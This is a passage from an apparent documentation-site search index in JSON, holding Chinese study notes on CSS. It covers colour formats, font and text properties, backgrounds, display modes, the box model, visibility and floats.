slug\":\"百分比\",\"contents\":[\"将属性值设置为相对于其父元素属性的百分比，可以使子元素跟随父元素的改变而改变\"]},{\"header\":\"em\",\"slug\":\"em\",\"contents\":[\"em是相对于元素的字体大小来计算的，1em = <self>.font-size，也就说em值会根据元素本身的字体大小的改变而改变\"]},{\"header\":\"rem\",\"slug\":\"rem\",\"contents\":[\"rem是相对于根元素的字体大小来计算，1em = <root>.font-size，也就说em值会根据根元素的字体大小的改变而改变\"]},{\"header\":\"颜色\",\"slug\":\"颜色\",\"contents\":[]},{\"header\":\"颜色名\",\"slug\":\"颜色名\",\"contents\":[\"编写方式：直接使用颜色对应的英文单词，编写比较简单\",\"如：\",\"红色：red\",\"绿色：green\",\"蓝色：blue\",\"紫色：purple\",\"橙色：orange\",\"灰色：gray\"]},{\"header\":\"rgb 或 rgba\",\"slug\":\"rgb-或-rgba\",\"contents\":[\"编写方式：使用红、黄、蓝这三种光的三原色进行组合\",\"r 表示红色， g 表示绿色， b 表示蓝色， a 表示透明度\",\"例：\",\"/* 使用 0~255 之间的数字表示一种颜色 */ color: rgb(255, 0, 0);/* 红色 */ color: rgb(0, 255, 0);/* 绿色 */ color: rgb(0, 0, 255);/* 蓝色 */ color: rgb(0, 0, 0);/* 黑色 */ color: rgb(255, 255, 255);/* 白色 */ /* 混合出任意一种颜色 */ color:rgb(138, 43, 226) /* 紫罗兰色 */ color:rgba(255, 0, 0, 0.5);/* 半透明的红色 */ /* 也可以使用百分比表示一种颜色（用的少） */ color: rgb(100%, 0%, 0%);/* 红色 */ color: rgba(100%, 0%, 0%,50%);/* 半透明的红色 */ \",\"小规律：\",\"若三种颜色值相同，呈现的是灰色，值越大，灰色越浅\",\"rgb (0, 0, 0) 是黑色， rgb (255, 255,255) 是白色\",\"对于 rbga 来说，前三位的 rgb 形式要保持一致，要么都是 0~255 的数字，要么都是百分比\"]},{\"header\":\"HEX 或 HEXA\",\"slug\":\"hex-或-hexa\",\"contents\":[\"HEX 的原理同与 rgb 一样，依然是通过：红、绿、蓝色进行组合，只不过要用 6位（分成3组） 来表达，格式为：#rrggbb\",\"每一位数字的取值范围是： 0 ~ f ，即：（ 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, a, b, c, d, e, f ），所以每一种光的最小值是： 00 ，最大值是： ff\",\"color: #ff0000;/* 红色 */ color: #00ff00;/* 绿色 */ color: #0000ff;/* 蓝色 */ color: #000000;/* 黑色 */ color: #ffffff;/* 白色 */ /* 如果每种颜色的两位都是相同的，就可以简写*/ color: #ff9988;/* 可简为：#f98 */ /* 但要注意前三位简写了，那么透明度就也要简写 */ color: #ff998866;/* 可简为：#f986 */ \"]},{\"header\":\"HSL 或 HSLA\",\"slug\":\"hsl-或-hsla\",\"contents\":[\"HSL 是通过：色相、饱和度、亮度，来表示一个颜色的，格式为：hsl(色相,饱和度,亮度)\",\"色相：取值范围是 0~360 度，具体度数对应的颜色如下图\",\"CSS长度和颜色01.png\",\"饱和度：取值范围是 0%~100% 。（向色相中对应颜色中添加灰色， 0% 全灰， 100% 没有灰）\",\"亮度：取值范围是 0%~100% 。（ 0% 亮度没了，所以就是黑色。 100% 亮度太强，所以就是白色了）\",\"HSLA 其实就是在 HSL 的基础上，添加了透明度\"]}]},\"/front-end/css-notes/05-CSS%E5%B8%B8%E7%94%A8%E5%B1%9E%E6%80%A7.html\":{\"title\":\"CSS常用属性\",\"contents\":[{\"header\":\"CSS 字体属性\",\"slug\":\"css-字体属性\",\"contents\":[]},{\"header\":\"字体大小\",\"slug\":\"字体大小\",\"contents\":[\"属性名：font-size\",\"作用：控制字体的大小\",\"语法：\",\"p { font-size: 20px; } \",\"谷歌浏览器支持的最小文字为 12px，默认的文字大小为 16 px，并且 0px 会自动消失\",\"不同浏览器可能默认显示的字号大小不一致，我们尽量给一个明确值大小，不要默认大小\",\"可以给 body 指定整个页面文字的大小\",\"由于字体设计原因，文字最终呈现的大小，并不一定与 font-size 的值一致，可能大，也可能小\",\"通常情况下，文字相对字体设计框，并不是垂直居中的，通常都靠下一些\"]},{\"header\":\"字体族\",\"slug\":\"字体族\",\"contents\":[\"属性名：font-family\",\"作用：控制字体类型\",\"语法：\",\"p{ font-family：\\\"微软雅黑\\\"； } \",\"各种字体之间必须使用英文状态下的逗号隔开\",\"一般情况下，如果有空格隔开的多个单词组成的字体，加引号\",\"尽量使用系统默认自带字体，保证在任何用户的浏览器中都能正确显示\",\"使用字体的英文名字兼容性会更好\",\"可以设置多个字体，按照从左到右的顺序逐个查找，找到就用，没有找到就使用后面的，且通常在最后写上 serif （衬线字体）或 sans-serif （非衬线字体）\"]},{\"header\":\"字体风格\",\"slug\":\"字体风格\",\"contents\":[\"属性名：font-style\",\"作用：控制字体是否为斜体\",\"语法：\",\"p { font-style: normal; } \",\"属性值\",\"作用\",\"normal\",\"默认值，浏览器会显示标准的字体样式\",\"italic\",\"浏览器会显示斜体的字体样式（推荐使用）\",\"oblique\",\"斜体（强制倾斜产生的斜体效果）\"]},{\"header\":\"字体粗细\",\"slug\":\"字体粗细\",\"contents\":[\"属性名：font-weight\",\"作用：控制字体的粗细\",\"语法：\",\"p { font-weight: bold; } p { font-weight: 600; } \",\"属性值\",\"描述\",\"normal\",\"默认值（不加粗的）\",\"bold\",\"定义粗体（加粗的）\",\"lighter\",\"细\",\"bolder\",\"很粗\",\"100~1000\",\"100~300 等同于 lighter，400~500 等同于 normal，而 600 及以上 等同于 bold，注意这个数字后面不跟单位\"]},{\"header\":\"字体的复合写法\",\"slug\":\"字体的复合写法\",\"contents\":[\"属性名：font，可以把上述字体样式合并成一个属性\",\"作用：将上述所有字体相关的属性复合在一起编写\",\"编写规则：\",\"字体大小、字体族必须都写上\",\"字体族必须是最后一位、字体大小必须是倒数第二位\",\"各个属性间用空格隔开\",\"body { font: font-style font-weight font-size/line-height font-family; } \"]},{\"header\":\"CSS 文本属性\",\"slug\":\"css-文本属性\",\"contents\":[]},{\"header\":\"文本颜色\",\"slug\":\"文本颜色\",\"contents\":[\"属性名：color\",\"作用：控制文字的颜色\",\"可选值：\",\"颜色名\",\"rgb 或 rgba\",\"HEX 或 HEXA （十六进制）（开发中最常用）\",\"HSL 或 HSLA\",\"语法：\",\"div { color: red; } \"]},{\"header\":\"文本间距\",\"slug\":\"文本间距\",\"contents\":[\"字母间距： letter-spacing\",\"单词间距： word-spacing （通过空格识别词）\",\"属性值为像素（ px ），正值让间距增大，负值让间距缩小\"]},{\"header\":\"文本修饰\",\"slug\":\"文本修饰\",\"contents\":[\"属性名：text-decoration\",\"作用：控制文本的各种装饰线\",\"语法：\",\"div { text-decoration：underline; } \",\"属性值\",\"描述\",\"none\",\"默认，没有装饰线\",\"underline\",\"下划线，链接自带下划线\",\"overline\",\"上划线\",\"line-through\",\"删除线\",\"可搭配如下值使用：\",\"dotted ：虚线\",\"wavy ：波浪线\",\"也可以指定颜色\"]},{\"header\":\"文本缩进\",\"slug\":\"文本缩进\",\"contents\":[\"属性名： text-indent\",\"作用：控制文本首字母的缩进\",\"语法：\",\"div { text-indent：20px； } div { text-indent：2em； } \",\"em 是一个相对单位，就是当前元素（font-size) 1 个文字的大小, 如果当前元素没有设置大小，则会按照父元素的 1 个文字大小\"]},{\"header\":\"文本对齐_水平\",\"slug\":\"文本对齐-水平\",\"contents\":[\"属性名：text-align\",\"作用：控制文本的水平对齐方式\",\"语法：\",\"div { text-align: center; } \",\"属性值\",\"解释\",\"left\",\"左对齐（默认值）\",\"right\",\"右对齐\",\"center\",\"居中对齐\"]},{\"header\":\"行高\",\"slug\":\"行高\",\"contents\":[\"属性名：line-height\",\"作用：控制一行文字的高度\",\"可选值：\",\"normal ：由浏览器根据文字大小决定的一个默认值\",\"像素 ( px )\",\"数字：参考自身 font-size 的倍数（很常用）\",\"百分比：参考自身 font-size 的百分比\",\"语法：\",\"p { line-height: 26px; line-height: 1.5; line-height: 150%; } \",\"行高注意事项：\",\"line-height 过小会怎样？—— 文字产生重叠，且最小值是 0 ，不能为负数\",\"line-height 是可以继承的，且为了能更好的呈现文字，最好写数值\",\"line-height 和 height 是什么关系？ \",\"设置了 height ，那么高度就是 height 的值\",\"不设置 height 的时候，会根据 line-height 计算高度\",\"应用场景：\",\"对于多行文字：控制行与行之间的距离\",\"对于单行文字：让 height 等于 line-height ，可以实现文字垂直居中（由于字体设计原因，靠上述办法实现的居中，并不是绝对的垂直居中，但如果一行中都是文字，不会太影响观感）\"]},{\"header\":\"文本对齐_垂直\",\"slug\":\"文本对齐-垂直\",\"contents\":[\"顶部：无需任何属性，在垂直方向上，默认就是顶部对齐\",\"居中：对于单行文字，让 height = line-height 即可\",\"底部：对于单行文字，目前一个临时的方式： 让 line-height = ( height × 2 ) - font-size - x ，备注： x 是根据字体族，动态决定的一个值\"]},{\"header\":\"vertical-align\",\"slug\":\"vertical-align\",\"contents\":[\"属性名： vertical-align\",\"作用：用于指定同一行元素之间，或表格单元格内文字的垂直对齐方式\",\"常用值：\",\"baseline （默认值）：使元素的基线与父元素的基线对齐\",\"top ：使元素的顶部与其所在行的顶部对齐\",\"middle ：使元素的中部与父元素的基线加上父元素字母 x 的一半对齐\",\"bottom ：使元素的底部与其所在行的底部对齐\",\"特别注意： vertical-align 不能控制块元素\"]},{\"header\":\"CSS 列表属性\",\"slug\":\"css-列表属性\",\"contents\":[\"列表相关的属性，可以作用在 ul 、 ol 、 li 元素上\"]},{\"header\":\"list-style-type\",\"slug\":\"list-style-type\",\"contents\":[\"功能：设置列表符号\",\"属性值：\",\"none：不显示前面的标识\",\"square：实心方块\",\"disc：圆形\",\"decimal：数字\",\"lower-roman：小写罗马字\",\"upper-roman：大写罗马字\",\"lower-alpha：小写字母\",\"upper-alpha：大写字母\"]},{\"header\":\"list-style-position\",\"slug\":\"list-style-position\",\"contents\":[\"功能：设置列表符号的位置\",\"属性值：\",\"inside ：在 li 的里面\",\"outside ：在 li 的外边\"]},{\"header\":\"list-style-image\",\"slug\":\"list-style-image\",\"contents\":[\"功能：自定义列表符号\",\"属性值：url(图片地址)\"]},{\"header\":\"list-style\",\"slug\":\"list-style\",\"contents\":[\"功能：复合属性\",\"属性值：没有数量、顺序的要求\"]},{\"header\":\"CSS 表格属性\",\"slug\":\"css-表格属性\",\"contents\":[]},{\"header\":\"边框相关属性\",\"slug\":\"边框相关属性\",\"contents\":[\"CSS 属性名\",\"功能\",\"属性值\",\"border-width\",\"边框宽度\",\"CSS 中可用的长度值\",\"border-color\",\"边框颜色\",\"CSS 中可用的颜色值\",\"border-style\",\"边框风格\",\"none 默认值solid 实线dashed 虚线dotted 点线double 双实线\",\"border\",\"边框复合属性\",\"没有数量、顺序的要求\",\"注意：以上 4 个边框相关的属性，其他元素也可以用\"]},{\"header\":\"表格独有属性\",\"slug\":\"表格独有属性\",\"contents\":[\"CSS 属性名\",\"功能\",\"属性值\",\"table-layout\",\"设置列宽度\",\"auto 自动，列宽度根据内容计算（默认值）fixed 固定列宽，平均分\",\"border-spacing\",\"单元格间距\",\"CSS 中可用的长度值 （生效的前提是单元格边框不能合并）\",\"border-collapse\",\"合并单元格边框\",\"collapse 合并separate 不合并\",\"empty-cells\",\"隐藏没有内容的单元格\",\"show 显示，默认值hide 隐藏 （生效的前提是单元格不能合并）\",\"caption-side\",\"设置表格标题位置\",\"top 上面，默认值bottom 在表格下面\",\"注意：以上 5 个属性，只有表格才能使用，即 <table> 标签\"]},{\"header\":\"CSS 的背景\",\"slug\":\"css-的背景\",\"contents\":[\"通过 CSS 背景属性，可以给页面元素添加背景样式\",\"背景属性可以设置背景颜色、背景图片、背景平铺、背景图片位置、背景图像固定等\"]},{\"header\":\"背景颜色\",\"slug\":\"背景颜色\",\"contents\":[\"样式名称：background-color 定义元素的背景颜色\",\"使用方式：\",\"background-color：颜色值； \",\"其他说明： 元素背景颜色默认值是 transparent（透明）\",\"background-color:transparent； \"]},{\"header\":\"背景图片\",\"slug\":\"背景图片\",\"contents\":[\"样式名称：background-image 定义元素的背景图片\",\"使用方式：\",\"background-image:none | url(url); \",\"参数值\",\"作用\",\"none\",\"无背景图（默认的）\",\"url\",\"使用绝对或相对地址指定背景图像\",\"其他说明：实际开发常见于 logo 或者一些装饰性的小图片或者是超大的背景图片, 优点是非常便于控制位置 (精灵图也是一种运用场景)\",\"注意：背景图片后面的地址，千万不要忘记加 url，同时里面的路径不要加引号\"]},{\"header\":\"背景平铺\",\"slug\":\"背景平铺\",\"contents\":[\"样式名称：background-repeat 设置元素背景图像的平铺\",\"使用方式：\",\"background-repeat:repeat | no-repeat | repeat-x | repeat-y; \",\"参数值\",\"作用\",\"repeat\",\"背景图像在纵向和横向上平铺（默认的）\",\"no-repeat\",\"背景图像不平铺\",\"repeat-x\",\"背景图像在横向上平铺\",\"repeat-y\",\"背景图像在纵向上平铺\",\"注意：背景图片会压住背景颜色\"]},{\"header\":\"背景图片位置\",\"slug\":\"背景图片位置\",\"contents\":[\"样式名称：background-position 属性可以改变图片在背景中的位置\",\"使用方式：\",\"background-position:x y; \",\"参数含义：x 坐标和 y 坐标。可以使用方位名词或者精确单位\",\"参数值\",\"说明\",\"length\",\"百分数、由浮点数或单位标识符组成的长度值\",\"position\",\"top、center、bottom、left、center、right 等方位名词\",\"其他说明：\",\"参数是方位名词, 如果指定的两个值都是方位名词，则两个值前后顺序无关，比如 left top 和 top left 效果一致, 如果只指定了一个方位名词，另一个值省略，则第二个值默认居中对齐\",\"参数是精确单位, 如果参数值是精确坐标，那么第一个肯定是 x 坐标，第二个一定是 y 坐标, 如果只指定一个数值，那该数值一定是 x 坐标，另一个默认垂直居中\",\"参数是混合单位, 如果指定的两个值是精确单位和方位名词混合使用，则第一个值是 x 坐标，第二个值是 y 坐标\"]},{\"header\":\"背景图片固定\",\"slug\":\"背景图片固定\",\"contents\":[\"样式名称：background-attachment 属性设置背景图像是否固定或者随着页面的其余部分滚动\",\"使用方式：\",\"background-attachment:scroll | fixed; \",\"参数\",\"作用\",\"scroll\",\"背景图像是随对象内容滚动\",\"fixed\",\"背景图像固定\",\"其他说明：background-attachment 可以制作视差滚动的效果\"]},{\"header\":\"背景样式复合写法\",\"slug\":\"背景样式复合写法\",\"contents\":[\"背景合写样式：background: 背景颜色、背景图片地址、背景平铺、背景图像滚动、背景图片位置;\",\"使用方式：\",\"background: 背景颜色 背景图片地址 背景平铺 背景图像滚动 背景图片位置； \"]},{\"header\":\"背景色半透明\",\"slug\":\"背景色半透明\",\"contents\":[\"CSS3 提供了背景颜色半透明的效果\",\"使用方式：\",\"background：rgba(0,0,0,0.3); \",\"最后一个参数是 alpha 透明度，取值范围在 0~1 之间\",\"我们习惯把 0.3 的 0 省略掉，写为 background:rgba(0,0,0,.3);\",\"注意：\",\"背景半透明是指盒子背景半透明，盒子里面的内容不受影响\"]},{\"header\":\"背景总结\",\"slug\":\"背景总结\",\"contents\":[\"属性\",\"作用\",\"值\",\"background-color\",\"背景颜色\",\"预定义的颜色值/十六进制/RGB 代码\",\"background-image\",\"背景图片\",\"url (图片路径)\",\"background-repeat\",\"是否平铺\",\"repeat/no-repeat/repeat-x/repeat-y\",\"background-position\",\"背景位置\",\"length/position 分别是 x 和 y 坐标\",\"background-attachment\",\"背景附着\",\"scroll（背景滚动）/fixed（背景固定）\",\"背景简写\",\"书写更简单\",\"背景颜色、背景图片地址、背景平铺、背景图像滚动、背景图片位置\",\"背景色半透明\",\"背景颜色半透明\",\"background: rgba ()\"]},{\"header\":\"CSS 鼠标属性\",\"slug\":\"css-鼠标属性\",\"contents\":[\"CSS 属性名\",\"功能\",\"属性值\",\"cursor\",\"设置鼠标光标的样式\",\"pointer 小手move 移动图标 text 文字选择器 crosshair 十字架wait 等待help 帮助\",\"扩展：自定义鼠标图标\",\"/* 自定义鼠标光标 */ cursor: url(\\\"./arrow.png\\\"),pointer; \"]}]},\"/front-end/css-notes/06-CSS%E5%85%83%E7%B4%A0%E6%98%BE%E7%A4%BA%E6%A8%A1%E5%BC%8F.html\":{\"title\":\"CSS元素显示模式\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"定义：元素显示模式就是元素（标签）以什么方式进行显示，比如 <div> 自己占一行，比如一行可以放多个 <span>\",\"作用：网页的标签非常多，在不同地方会用到不同类型的标签，了解他们的特点可以更好的布局我们的网页\"]},{\"header\":\"元素显示模式的分类\",\"slug\":\"元素显示模式的分类\",\"contents\":[]},{\"header\":\"块元素\",\"slug\":\"块元素\",\"contents\":[\"<!-- 主体结构标签 --> <html>、<body> <!-- 排版标签 --> <h1>~<h6>、<hr>、<p>、<pre>、<div> <!-- 列表标签 --> <ul>、<ol>、<li>、<dl>、<dt>、<dd> <!-- 表格相关标签 --> <table>、<tbody>、<thead>、<tfoot>、<tr>、<caption> <!-- 表单相关标签 --> <form>与<option> \",\"块级元素的特点：\",\"在页面中独占一行，不会与任何元素共用一行，是从上到下排列的\",\"默认宽度：撑满父元素\",\"默认高度：由内容撑开\",\"可以通过 CSS 设置宽高\",\"注意：\",\"文字类的元素内不能放块级元素\",\"<p> 标签主要用于存放文字，因此 <p> 里面不能放块级元素，特别是不能放 <div>\",\"<h1>~<h6> 等都是文字类块级标签，里面也不能放其他块级元素\"]},{\"header\":\"行内元素\",\"slug\":\"行内元素\",\"contents\":[\"<!-- 文本标签 --> <br>、<em>、<strong>、<sup>、<sub>、<del>、<ins> <!-- 其它标签 --> <a>与<label> \",\"<span> 标签是最典型的行内元素。有的地方也将行内元素称为内联元素\",\"行内元素的特点：\",\"在页面中不独占一行，一行中不能容纳下的行内元素，会在下一行继续从左到右排列\",\"默认宽度：由内容撑开\",\"默认高度：由内容撑开\",\"无法通过 CSS 设置宽高\",\"注意：\",\"链接里面不能再放链接\",\"特殊情况链接 <a> 里面可以放块级元素，但是给 <a> 转换成块级模式最安全\"]},{\"header\":\"行内块元素\",\"slug\":\"行内块元素\",\"contents\":[\"<!-- 图片 --> <img> <!-- 单元格 --> <td>、<th> <!-- 表单控件 --> <input>、<textarea>、<select>、<button> <!-- 框架标签 --> <iframe> \",\"它们同时具有块元素和行内元素的特点\",\"行内块元素的特点：\",\"在页面中不独占一行，一行中不能容纳下的行内元素，会在下一行继续从左到右排 列\",\"默认宽度：由内容撑开\",\"默认高度：由内容撑开\",\"可以通过 CSS 设置宽高\"]},{\"header\":\"总结\",\"slug\":\"总结\",\"contents\":[\"元素模式\",\"元素排列\",\"设置样式\",\"默认宽度\",\"包含\",\"块级元素\",\"一行只能放一个块级元素\",\"可以设置宽度高度\",\"容器的 100%\",\"容器可以包含任何标签\",\"行内元素\",\"一行可以放多个行内元素\",\"不可以直接设置宽度高度\",\"它本身内容的宽度\",\"容纳文本或其他行内元素\",\"行内块元素\",\"一行放多个行内块元素\",\"可以设置宽度和高度\",\"它本身内容的宽度\"]},{\"header\":\"元素显示模式的转换\",\"slug\":\"元素显示模式的转换\",\"contents\":[\"通过 CSS 中的 display 属性可以修改元素的默认显示模式\",\"转换方式：\",\"转换为块元素：display: block;\",\"转换为行内元素：display: inline;\",\"转换为行内块：display: inline-block;\",\"隐藏：display: none;\"]}]},\"/front-end/css-notes/07-CSS%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B.html\":{\"title\":\"CSS盒子模型\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"CSS 会把所有的 HTML 元素都看成一个盒子，所有的样式也都是基于这个盒子\",\"margin（外边距）： 盒子与外界的距离\",\"border（边框）： 盒子的边框\",\"padding（内边距）： 紧贴内容的补白区域\",\"content（内容）：元素中的文本或后代元素都是它的内容\",\"CSS盒子模型01.png\",\"盒子的大小=content+左右 padding+左右border\",\"注意：外边距 margin 不会影响盒子的大小，但会影响盒子的位置\"]},{\"header\":\"盒子内容区（content）\",\"slug\":\"盒子内容区-content\",\"contents\":[\"CSS 属性名\",\"功能\",\"属性值\",\"width\",\"设置内容区域宽度\",\"长度\",\"max-width\",\"设置内容区域的最大宽度\",\"长度\",\"min-width\",\"设置内容区域的最小宽度\",\"长度\",\"height\",\"设置内容区域高度\",\"长度\",\"max-height\",\"设置内容区域的最大高度\",\"长度\",\"min-height\",\"设置内容区域的最小高度\",\"长度\",\"注意：\",\"max-width 、 min-width 一般不与 width 一起使用\",\"max-height 、 min-height 一般不与 height 一起使用\"]},{\"header\":\"盒子内边距（padding）\",\"slug\":\"盒子内边距-padding\",\"contents\":[\"CSS 属性名\",\"功能\",\"属性值\",\"padding-top\",\"上内边距\",\"长度\",\"padding-right\",\"右内边距\",\"长度\",\"padding-bottom\",\"下内边距\",\"长度\",\"padding-left\",\"左内边距\",\"长度\",\"padding\",\"复合属性\",\"长度，可以设置 1~4 个值\",\"padding 复合属性的使用规则：\",\"padding: 10px; 四个方向内边距都是 10px\",\"padding: 10px 20px; 上下 10px ，左右 20px 。（上下、左右）\",\"padding: 10px 20px 30px; 上 10px ，左右 20px ，下 30px 。（上、左右、下）\",\"padding: 10px 20px 30px 40px; 上 10px ，右 20px ，下 30px ，左 40px 。（上、右、下、左）\",\"注意点：\",\"padding 的值不能为负数\",\"行内元素的左右内边距是没问题的，上下内边距不能完美的设置\",\"块级元素、行内块元素，四个方向内边距都可以完美设置\"]},{\"header\":\"盒子边框（border）\",\"slug\":\"盒子边框-border\",\"contents\":[\"border 可以设置元素的边框\",\"边框由三部分组成：边框宽度 (粗细)、边框样式、边框颜色\",\"语法：\",\"border : border-width || border-style || border-color; \",\"属性\",\"作用\",\"border-width\",\"定义边框粗细，单位是 px\",\"border-style\",\"边框的样式\",\"border-color\",\"边框颜色\",\"边框样式 border-style 可以设置如下值：\",\"none：没有边框即忽略所有边框的宽度（默认值）\",\"solid：边框为单实线 (最为常用的)\",\"dashed：边框为虚线\",\"dotted：边框为点线\",\"边框简写：\",\"border: 1px solid red; /* 没有顺序 */ \",\"边框分开写法：\",\"border-top: 1px solid red; /* 只设定上边框， 其余同理 */ \"]},{\"header\":\"盒子外边距（margin）\",\"slug\":\"盒子外边距-margin\",\"contents\":[\"margin 属性用于设置外边距，即控制盒子和盒子之间的距离\",\"属性\",\"作用\",\"margin-left\",\"左外边距\",\"margin-right\",\"右外边距\",\"margin-top\",\"上外边距\",\"margin-bottom\",\"下外边距\"]},{\"header\":\"margin 注意事项\",\"slug\":\"margin-注意事项\",\"contents\":[\"子元素的 margin ，是参考父元素的 content 计算的。（因为是父亲的 content 中承装着子元素）\",\"上 margin 、左 margin ：影响自己的位置；下 margin 、右 margin ：影响后面兄弟元素的位置\",\"块级元素、行内块元素，均可以完美地设置四个方向的 margin ；但行内元素，左右 margin 可以完美设置，上下 margin 设置无效\",\"margin 的值也可以是 auto ，如果给一个块级元素设置左右 margin 都为 auto ，该块级元素会在父元素中水平居中\",\"margin 的值可以是负值\"]},{\"header\":\"margin 合并问题\",\"slug\":\"margin-合并问题\",\"contents\":[\"上面兄弟元素的下外边距和下面兄弟元素的上外边距会合并，取一个最大的值，而不是相加\",\"相邻块元素垂直外边距的合并\",\"当上下相邻的两个块元素（兄弟关系）相遇时，如果上面的元素有下外边距 margin-bottom，下面的元素有上外边距 margin-top ，则他们之间的垂直间距不是 margin-bottom 与 margin-top 之和。取两个值中的较大者这种现象被称为相邻块元素垂直外边距的合并\",\"解决方案：尽量只给一个盒子添加 margin 值\",\"CSS盒子模型02.png\"]},{\"header\":\"margin 塌陷问题\",\"slug\":\"margin-塌陷问题\",\"contents\":[\"第一个子元素的上 margin 会作用在父元素上，最后一个子元素的下 margin 会作用在父元素上\",\"嵌套块元素垂直外边距的塌陷\",\"对于两个嵌套关系（父子关系）的块元素，父元素有上外边距同时子元素也有上外边距，此时父元素会塌陷较大的外边距值\",\"解决方案： \",\"可以为父元素定义上边框（border）\",\"可以为父元素定义上内边距（padding）\",\"可以为父元素添加 overflow:hidden\",\"CSS盒子模型03.png\"]}]},\"/front-end/css-notes/08-CSS%E5%85%83%E7%B4%A0%E6%98%BE%E7%A4%BA%E4%B8%8E%E9%9A%90%E8%97%8F.html\":{\"title\":\"CSS元素显示与隐藏\",\"contents\":[{\"header\":\"元素的显示与隐藏\",\"slug\":\"元素的显示与隐藏\",\"contents\":[\"目的：让一个元素在页面中消失或者显示出来\",\"场景：类似网站广告，当我们点击关闭就不见了，但是我们重新刷新页面，会重新出现\"]},{\"header\":\"display 显示\",\"slug\":\"display-显示\",\"contents\":[\"display 属性用于设置一个元素应如何显示\",\"display: none； /* 隐藏对象 */ display：block；/* 除了转换为块级元素之外，同时还有显示元素的意思 */ \",\"特点： display 隐藏元素后，不再占有原来的位置\"]},{\"header\":\"visibility 可见性\",\"slug\":\"visibility-可见性\",\"contents\":[\"visibility 属性用于指定一个元素应可见还是隐藏\",\"visibility：visible; /* 元素可视 */ visibility：hidden; /* 元素隐藏 */ \",\"特点：visibility 隐藏元素后，继续占有原来的位置\",\"如果隐藏元素想要原来位置，就用 visibility:hidden;\",\"如果隐藏元素不想要原来位置，就用 display:none;\"]},{\"header\":\"overflow 溢出\",\"slug\":\"overflow-溢出\",\"contents\":[\"overflow 属性指定了如果内容溢出一个元素的框（超过其指定高度及宽度） 时，会发生什么\",\"属性值\",\"描述\",\"visible\",\"不剪切内容也不添加滚动条\",\"hidden\",\"不显示超过对象尺寸的内容，超出的部分隐藏掉\",\"scroll\",\"不管超出内容否，总是显示滚动条\",\"auto\",\"超出自动显示滚动条，不超出不显示滚动条\",\"一般情况下，我们都不想让溢出的内容显示出来，因为溢出的部分会影响布局\",\"但是如果有定位的盒子，请慎用 overflow:hidden 因为它会隐藏多余的部分\",\"用途 \",\"清除浮动\",\"保证盒子里面的内容不会超出该盒子范围\"]},{\"header\":\"显示与隐藏总结\",\"slug\":\"显示与隐藏总结\",\"contents\":[\"属性\",\"区别\",\"用途\",\"display 显示\",\"隐藏对象，不保留位置\",\"配合后面 js 做特效，比如下拉菜单，原先没有，鼠标经过，显示下拉菜单，应用极为广泛\",\"visibility 可见性\",\"隐藏对象，保留位置\",\"使用较少\",\"overflow 溢出\",\"只是隐藏超出大小的部分\",\"1. 可以清除浮动 2. 保证盒子里面的内容不会超出该盒子范围\"]}]},\"/front-end/css-notes/09-CSS%E4%BC%A0%E7%BB%9F%E7%BD%91%E9%A1%B5%E5%B8%83%E5%B1%80%E6%96%B9%E5%BC%8F.html\":{\"title\":\"CSS传统网页布局方式\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"CSS 提供了三种传统布局方式 (简单说, 就是盒子如何进行排列)：\",\"普通流（标准流）\",\"浮动\",\"定位\",\"这三种布局方式都是用来摆放盒子的，盒子摆放到合适位置，布局自然就完成了\",\"注意：实际开发中，一个页面基本都包含了这三种布局方式\"]},{\"header\":\"标准流（普通流/文档流）\",\"slug\":\"标准流-普通流-文档流\",\"contents\":[\"所谓的标准流: 就是标签按照规定好默认方式排列\",\"块级元素会独占一行，从上向下顺序排列 \",\"常用元素：div、hr、p、h1~h6、ul、ol、dl、form、table\",\"行内元素会按照顺序，从左到右顺序排列，碰到父元素边缘则自动换行 \",\"常用元素：span、a、i、em 等\",\"标准流是最基本的布局方式\"]},{\"header\":\"浮动\",\"slug\":\"浮动\",\"contents\":[]},{\"header\":\"为什么需要浮动\",\"slug\":\"为什么需要浮动\",\"contents\":[\"有很多的布局效果，标准流没有办法完成，此时就可以利用浮动完成布局。因为浮动可以改变元素标签默认的排列方式\",\"浮动最典型的应用：可以让多个块级元素一行内排列显示\",\"网页布局第一准则：多个块级元素纵向排列找标准流，多个块级元素横向排列找浮动\"]},{\"header\":\"什么是浮动\",\"slug\":\"什么是浮动\",\"contents\":[\"float 属性用于创建浮动框，将其移动到一边，直到左边缘或右边缘触及块或另一个浮动框的边缘\",\"语法：\",\" 选择器 { float: 属性值; } \",\"属性值\",\"描述\",\"none\",\"元素不浮动（默认值）\",\"left\",\"元素向左浮动\",\"right\",\"元素向右浮动\"]},{\"header\":\"浮动特性\",\"slug\":\"浮动特性\",\"contents\":[\"加了浮动之后的元素, 会具有很多特性\",\"浮动元素会脱离标准流 (脱标：浮动的盒子不再保留原先的位置)\",\"CSS传统网页布局方式01.png\",\"浮动的元素会一行内显示并且元素顶部对齐 \",\"注意：浮动的元素是互相贴靠在一起的（不会有缝隙），如果父级宽度装不下这些浮动的盒子，多出的盒子会另起一行对齐\",\"浮动的元素会具有行内块元素的特性 \",\"任何元素都可以浮动，如果块级盒子没有设置宽度，默认宽度和父级一样宽，但是添加浮动后，它的大小根据内容来决定\",\"浮动的盒子中间是没有缝隙的\"]},{\"header\":\"浮动元素经常和标准流父级搭配使用\",\"slug\":\"浮动元素经常和标准流父级搭配使用\",\"contents\":[\"为了约束浮动元素位置, 我们网页布局一般采取的策略是: 先用标准流父元素排列上下位置, 之后内部子元素采取浮动排列左右位置，符合网页布局第一准侧\",\"CSS传统网页布局方式02.png\"]},{\"header\":\"浮动布局注意点\",\"slug\":\"浮动布局注意点\",\"contents\":[\"浮动和标准流的父盒子搭配 \",\"先用标准流的父元素排列上下位置, 之后内部子元素采取浮动排列左右位置\",\"一个元素浮动了，理论上其余的兄弟元素也要浮动 \",\"一个盒子里面有多个子盒子，如果其中一个盒子浮动了，其他兄弟也应该浮动，以防止引起问题\",\"浮动的盒子只会影响浮动盒子后面的标准流, 不会影响前面的标准流\"]},{\"header\":\"清除浮动\",\"slug\":\"清除浮动\",\"contents\":[]},{\"header\":\"为什么需要清除浮动\",\"slug\":\"为什么需要清除浮动\",\"contents\":[\"由于父级盒子很多情况下，不方便给高度，但是子盒子浮动又不占有位置，最后父级盒子高度为 0 